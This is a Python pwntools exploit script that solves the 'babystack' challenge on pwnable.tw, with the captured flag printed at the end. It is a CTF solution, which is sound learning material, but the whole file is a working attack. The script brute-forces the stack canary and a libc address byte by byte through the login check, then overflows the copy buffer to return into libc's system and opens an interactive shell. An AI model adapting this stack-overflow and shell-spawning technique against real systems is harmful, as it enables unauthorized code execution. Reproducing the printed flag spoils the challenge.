from pwn import *

elf = ELF("./babystack")
libc = ELF("libc_64.so.6")

r = remote('chall.pwnable.tw', 10205)


def login(password, check=1):
    r.sendafter(">> ", str(1))
    if check == 1:
        r.sendafter("passowrd :", password)
        if b"Success" in r.recvline():
            return 1
    return 0


def attack(data="A" * 0x3f):
    r.sendafter(">> ", str(3))
    r.sendafter("Copy :", data)


canary = b""
with log.progress("leaking password") as l:
    for i in range(0x10):
        l.status("%d/16" % (i + 1))
        for j in range(1, 0x100):
            if login(canary + p8(j) + b"\x00") == 1:
                canary += p8(j)
                login("A", 0)
                break

payload = (canary + b"\x00").ljust(0x40, b"A")
payload += canary
login(payload)
attack()
login("A", 0)
libc_leak = b"\x31"
with log.progress("leaking libc") as l:
    for i in range(0x4):
        l.status("%d/4" % (i + 1))
        for j in range(1, 0x100):
            if login(canary + libc_leak + p8(j) + b"\x00") == 1:
                libc_leak += p8(j)
                login("A", 0)
                break

libc_leak += b"\x7f"
libc_base = u64(libc_leak.ljust(8, b"\x00")) - 0x3c4631
log.success("libc_base --> %s" % hex(libc_base))
libc_system = libc_base + libc.symbols["system"]
payload = (canary + b"\x00").ljust(0x40, b"A")
payload += canary.ljust(0x28, b"A")
payload += p64(libc_system)
login(payload)
attack()
r.sendafter(">> ", "2; sh\x00")
r.interactive()

# FLAG --> FLAG{Its_juS7_a_st4ck0v3rfl0w}
